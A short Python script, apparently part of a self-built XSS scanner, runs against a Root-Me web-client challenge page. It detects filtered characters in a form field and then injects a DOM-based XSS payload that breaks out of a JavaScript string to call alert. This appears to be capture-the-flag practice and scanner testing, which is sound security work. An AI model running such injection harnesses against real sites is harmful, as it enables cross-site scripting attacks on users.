from modules.vuln_detector import detect_xss
from modules.filter_detector import detect_filters
from models import RequestModel, AttackType, AttackVector
from selenium.webdriver.common.by import By
from modules.requestor import Requestor


TEST_PAYLOAD = """'; alert("xss dom based"); var cat= ' """


if __name__ == '__main__':
    requestor = Requestor()
    url = "http://challenge01.root-me.org/web-client/ch32/"
    rm = RequestModel(
        url=url,
        affects=url,
    )
    vector = AttackVector(type=By.NAME, value='number')
    rm.set_vector(vector=vector)
    rm.add_attackType(attackType=AttackType.DOM)

    # detect filters
    fc = detect_filters(requestor=requestor, requestModel=rm)
    print(f"\nLes caractères filtrés sont : {fc}")

    # attack
    rm.set_payload(payload=TEST_PAYLOAD)
    detect_xss(requestor=requestor, requestModel=rm)

    requestor.dispose()
